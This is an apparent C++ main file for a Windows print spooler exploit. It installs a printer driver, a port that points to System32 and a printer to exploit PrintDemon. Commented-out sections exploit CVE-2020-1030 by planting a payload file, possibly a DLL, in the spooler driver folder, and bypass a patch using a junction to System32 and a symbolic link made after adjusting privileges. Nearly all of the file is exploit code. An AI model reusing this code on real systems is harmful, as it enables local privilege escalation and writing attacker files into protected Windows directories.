#include <iostream>
#include <Windows.h>

#include "printers.h"
#include "utils.h"; 
#include "exploits.h"

struct PrinterExploitInfo {
	wchar_t *driverName, *portName, *printerName; 
	PrinterExploitInfo(wchar_t* driverName, wchar_t* portName, wchar_t* printerName)
		: driverName(driverName), portName(portName), printerName(printerName) {}
};

int main(int argc, wchar_t* argv[]) {

	bool isRestarted = isAppStartedFromReboot(argc, argv);

	// PrintDemon 
	PrinterExploitInfo printDemonInfo(
		const_cast<wchar_t*>(L"Generic / Text Only"),
		const_cast<wchar_t*>(L"C:\\Windows\\System32\\malicious.txt"),
		const_cast<wchar_t*>(L"print_demon"));

	if (!isRestarted) {
		//bypassPD: creation tmp directory
		/*bool isCreatedTmp = CreateDirectoryW(L"C:\\Users\\User\\Desktop\\tmp", NULL);
		if (!isCreatedTmp) {
			std::cout << "[-] Tmp dir ERROR :" << GetLastError() << std::endl;
			system("pause"); 
			return -1;
		}
		std::cout << "[+] Tmp dir created !\n";*/ 
		
		HRESULT driverResult = AddDriver(printDemonInfo.driverName);
		DWORD portResult = AddPort(printDemonInfo.portName);
		HANDLE hPrinter = AddPrinter(printDemonInfo.printerName, printDemonInfo.driverName, printDemonInfo.portName);
		ClosePrinter(hPrinter);
		
		//bypassPD: removal tmp dir + creation symbolic link
		/*bool isRemovedTmp = RemoveDirectoryW(L"C:\\Users\\User\\Desktop\\tmp");
		
		if(!isRemovedTmp) {
			std::cout << "[-] Removed directory ERROR: " << GetLastError();
			system("pause");
			return -1;
		}

		std::cout << "[+] Tmp dir correctly removed !\n";

		//createJunction(const_cast<wchar_t*>(L"C:\\Users\\Bob\\Desktop\\tmp"), const_cast<wchar_t*>(L"C:\\Users\\Bob\\Desktop\\program"));
		system("cmd /c mklink  /J \"C:\\Users\\User\\Desktop\\tmp\" \"C:\\Windows\\System32\"");*/
	}

	std::string payload = "Hello, PrintDemon";
	print_demon(printDemonInfo.printerName, payload, isRestarted);
	/*
	// cve_2020_1030 
	PrinterExploitInfo cve_2020_1030Info(
		const_cast<wchar_t*>(L"Microsoft Print To PDF"),
		const_cast<wchar_t*>(L"PORTPROMPT:"),
		const_cast<wchar_t*>(L"cve_2020_1030 printer"));

	if (!isRestarted) {
		HRESULT driverResult = AddDriver(cve_2020_1030Info.driverName);
		DWORD portResult = AddPort(cve_2020_1030Info.portName);
		HANDLE hPrinter = AddPrinter(cve_2020_1030Info.printerName, cve_2020_1030Info.driverName, cve_2020_1030Info.portName);
		ClosePrinter(hPrinter);
	}
	wchar_t* filePath = const_cast<wchar_t*>(L"C:\\Users\\User\\Desktop\\payload.txt"); // can also be .dll 
	// std::string fileName = "cve_2020_1030.txt"; // file to insert inside C:\Windows\System32\spool\drivers\x64\4
	cve_2020_1030(cve_2020_1030Info.printerName, filePath, isRestarted); 
	*/
	system("pause"); 
	return 0; 
}


/*
//bypassPD: create symbolic link to SYSTEM32
HANDLE hToken;
LUID luid;
if (LookupPrivilegeValue(NULL, L"SeCreateSymbolicLinkPrivilege", &luid))
{
	// Get a token for this process.
	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		std::cout << "[-] Error while obtaining token for current process: " << GetLastError() << std::endl;
		return -1;
	}

	std::cout << "[+] Obtained token for current process" << std::endl;

	TOKEN_PRIVILEGES token_privileges;
	token_privileges.PrivilegeCount = 1;
	token_privileges.Privileges[0].Luid = luid;
	token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &token_privileges, 0, NULL, NULL))
	{
		std::cout << "[-] Error:" << GetLastError();// TODO: call GetLastError and report an error.
		return -1;
	}

	std::cout << "[+] Ok it works\n";

}

bool isCreateSymbolic = CreateSymbolicLinkW(L"C:\\Users\\Bob\\Desktop\\tmp", L"C:\\Users\\Bob\\Desktop\\program",
	0x0 );

if (!isCreateSymbolic) {
	std::cout << "[-] Symbolic link ERROR: " << GetLastError()<< std::endl;
	return -1;
}

std::cout << "[+] Symbolic link CREATED" << std::endl;
*/